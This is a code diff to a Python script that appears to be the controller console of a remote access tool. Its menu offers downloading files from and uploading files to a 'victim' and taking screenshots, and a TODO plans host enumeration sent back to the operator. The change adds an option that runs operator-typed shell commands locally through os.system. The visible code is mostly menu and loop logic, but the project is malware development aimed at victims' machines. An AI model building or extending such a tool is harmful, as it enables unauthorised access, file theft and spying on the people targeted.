@@ -27,7 +27,7 @@
 ## COMPLETE: Cleanup Script
 ## TODO: Have a 'snapshot'.. where it enumerates the host and sends it back 
 ## TODO: Performs searches ?
-
+## COMPLETE: Add Local Command capability
 
 
 ######
@@ -80,6 +80,8 @@ def howToFunc():
     print("[*] Type '2' to download a file from victim")
     print("[*] Type '3' to upload a file to victim")
     print("[*] Type '4' to take a screenshot")
+    print("[*] Type 'shell' to run a local shell command")
+    print("[*] Type 'q' or 'Q' to shutdown")
 
 def mainLoopFunc():
     # Main Loop
@@ -87,7 +89,7 @@ def mainLoopFunc():
     #print('MAIN LOOP')
     while True:
         howToFunc()
-        user_input = str(raw_input("[+] Type '1', '2', '3', '4', or 'q/Q'\n"))
+        user_input = str(raw_input("[+] Type '1', '2', '3', '4', 'shell', or 'q/Q'\n"))
         print(user_input)
 
         ###################
@@ -205,6 +207,20 @@ def mainLoopFunc():
             time.sleep(SLEEP)
 
             continue
+        
+        ###########
+        ## 'shell' - For local shell command
+        ###########
+        elif user_input == 'shell':
+            # Get input from user and use os.system to run the command
+            command = raw_input('What local command do you want to run?\n')
+            output = os.system(command)
+            print(output)
+
+            time.sleep(SLEEP)
+
+            continue
+
         elif user_input is 'q':
             #print("QUIT")
             break
